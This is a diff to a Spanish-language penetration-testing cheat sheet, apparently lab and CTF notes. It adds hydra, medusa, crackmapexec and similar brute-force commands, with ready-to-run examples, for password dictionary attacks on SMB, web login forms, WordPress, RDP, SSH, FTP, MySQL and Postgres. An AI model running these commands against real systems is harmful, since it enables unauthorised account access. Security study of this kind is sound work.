@@ -164,6 +164,9 @@ EXPLOTACION
                         -u: Usuario
                         -p: Password 
                   crackmapexec smb 10.10.10.10 -u 'user' -p 'password.txt' => ataque de diccionario a un usuario determinado
+               
+                  hydra -l usuario -P lista.txt smb://IP -t 4
+                        Ej: hydra -l administrador -P passwords.txt smb://192.168.1.150 -t 4
 
       EXPLOTACION WEB
       ...............
@@ -172,14 +175,16 @@ EXPLOTACION
             ................
 
                   wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://web.com/carpeta => ataque de diccionario al panel de login de wordpress
-
-                     hydra –l <user> -P <diccionario> <IP> <servicio>
-                     hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81 => ataque basico http 
-                     hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
-                        Ej: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect' 
-                              hydra -l admin  -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.26.170/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=2bq42nigi9klq2jdm13g3qa9h3; security=low:F=Username and/or password incorrect'
-                        Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+                     
+                  hydra -l usuario -P lista.txt http-get://IP/ruta -t 4 => ataque basico http 
+                        Ej: hydra -l user -P passwords.txt 127.0.0.1 http-get / -s 81 
+                  hydra -l usuario -P lista.txt IP http-post-form "/ruta:campo_usuario=^USER^&campo_password=^PASS^:Falla" => Ataque web con formulario login
                         Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
+                  hydra -L user.txt -P rockyou.txt <IP> http-post-form "[URL]:[TOKEN-URL]:Login failed"
+                        Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect' 
+                        Ej: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+                           Flag Mayuscula = Lista palabras
+                           Flag Minuscula = sabemos usuario o contraseña
 
                   Burpsuite
                      1 - Interceptar peticion
@@ -415,10 +420,16 @@ EXPLOTACION
 
       ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login
 
+      hydra -l usuario -P lista.txt rdp://IP -t 4
+         Ej: hydra -l Administrator -P rockyou.txt rdp://192.168.1.50 -t 4
+
       crowbar -b rdp -u user -C password_wordlist -s [IP] -v -- Other method to try cracking
 
       SSH
       ...   
+
+         hydra -l usuario -P lista_de_contraseñas.txt ssh://IP -t 4
+            Ej: hydra -l root -P passwords.txt ssh://192.168.1.100 -t 4
 
          medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
                      -h: Especifica la dirección IP del sistema de destino.
@@ -429,14 +440,24 @@ EXPLOTACION
                      -t: Determina el número de intentos de inicio de sesión paralelos que se ejecutan simultáneamente. Aumentar este número puede acelerar el ataque, pero también puede aumentar la probabilidad de detección o la activación de medidas de seguridad en el sistema objetivo.
 
          ssh sshuser@<IP> -p PORT => Este comando iniciará una sesión SSH interactiva
-
+         
       FTP   
       ...   
+
+         hydra -l usuario -P lista.txt ftp://IP -t 4
+            Ej: hydra -l anonymous -P passwords.txt ftp://192.168.1.20 -t 4
 
          medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
 
          ftp ftp://USER:<PASSWORD>@<IP>
          ftp ftp://USER@IP => si da problemas la password acceder asi y poner password cuando la pida. 
+
+      MySQL
+      .....
+
+         hydra -l usuario -P lista.txt mysql://IP -t 4
+            Ej: hydra -l root -P passwords.txt mysql://192.168.1.100 -t 4
+         hydra -l usuario -P lista.txt postgres://IP -t 4
 
 ANONIMATO/TOR
 .............
